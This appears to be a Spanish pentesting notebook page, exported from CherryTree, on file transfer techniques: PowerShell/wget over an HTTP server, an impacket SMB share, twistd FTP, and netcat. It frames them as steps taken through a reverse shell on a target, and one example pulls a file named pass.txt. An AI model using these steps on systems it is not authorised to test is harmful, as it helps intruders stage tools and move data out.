<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Transferencia de ficheros</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Transferencia de ficheros</h1><br/><p><h1>Técnicas de transferencia de ficheros</h1></p><p></p><p></p><p><strong><h2>Powershell / Wget</h2></strong></p><p><ul><li>Comando para servir el fichero en Linux y Windows:</li></ul></p><p></p><p><div class="codebox"><pre><br />python -m SimpleHTTPServer 8080</pre></div></p><p><ul><li>Comando para recibir el fichero en Windows:</li></ul></p><p></p><p><div class="codebox"><pre><br />powershell.exe  -c <span style="color:#edd400;font-weight:400">&quot;(New-Object  System.NET.WebClient).DownloadFile(&#39;http://192.168.20.129:8080/pass.txt~&#39;,&#39;C:\Users\ws02\Desktop\FiletoTransfer.txt&#39;)&quot;</span></pre></div></p><p><ul><li>Comando para recibir el fichero en Linux:</li></ul></p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">wget</span> http<span style="color:#000000;font-weight:700">://</span>192.168.20.X<span style="color:#000000;font-weight:700">:</span>8080<span style="color:#000000;font-weight:700">/</span>FiletoTransfer</pre></div></p><p></p><p></p><p><strong><h2>SMB</h2></strong></p><p><ul><li>Comando para servir el fichero en Linux:</li></ul></p><p></p><p><div class="codebox"><pre><br />impacket-smbserver -smb2support <span style="color:#000000;font-weight:700">test</span> .</pre></div></p><p><ul><li>Comando para recibir el fichero en Windows:</li></ul></p><p></p><p><div class="codebox"><pre><br />copy <span style="color:#ce5c00;font-weight:400">\\</span>192.168.20.129<span style="color:#ce5c00;font-weight:400">\t</span>est<span style="color:#ce5c00;font-weight:400">\p</span>ass.txt FiletoTransfer.txt </pre></div></p><p></p><p></p><p><strong><h2>FTP</h2></strong></p><p><ul><li>Comando para servir el fichero en Linux:</li></ul></p><p></p><p><div class="codebox"><pre><br />twistd3 -n <span style="color:#000000;font-weight:700">ftp</span> -r .</pre></div></p><p><ul><li>Comando para recibir el fichero en Windows:</li></ul></p><p></p><p><ol><li>ftp</li><li>open 192.168.20.X 2121</li><li>anonymous</li><li>get FiletoTransfer</li><li>bye</li></ol></p><p></p><p><ul><li>Comando para recibir el fichero en Linux</li></ul></p><p></p><p></p><p><div class="codebox"><pre><br /><span style="color:#000000;font-weight:700">wget</span> <span style="color:#000000;font-weight:700">ftp://</span>192.168.20.X<span style="color:#000000;font-weight:700">:</span>2121<span style="color:#000000;font-weight:700">/</span>FiletoTransfer</pre></div></p><p></p><p></p><p><strong><h2>Netcat</h2></strong></p><p><ul><li>Comando para recibir el fichero en Linux y Windows:</li></ul></p><p></p><p><div class="codebox"><pre><br />nc.exe -lvp 4444 &gt; FiletoTransfer</pre></div></p><p><ul><li>Comando para servir el fichero en Linux y Windows:</li></ul></p><p></p><p><div class="codebox"><pre><br />nc 192.168.20.X 4444 -w 3 &lt; FiletoTransfer</pre></div></p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p>Normalmente se dan dos casos en los que nos podemos encontrar diferentes maneras de transferir los archivos:</p><p><ul><li>Acceso lógico o físico a la interfaz gráfica objetivo</li><li>Acceso remoto con una shell reversa sin UID</li></ul></p><p></p><p>Para hacer esto vamos a aprovechar la reverse shell que teniamos con el binario que creamos en C#</p><p></p><p><img src="images/71-1.png" alt="images/71-1.png" /></p><p></p><p><img src="images/71-2.png" alt="images/71-2.png" /></p><p></p></div>
</body>
</html>
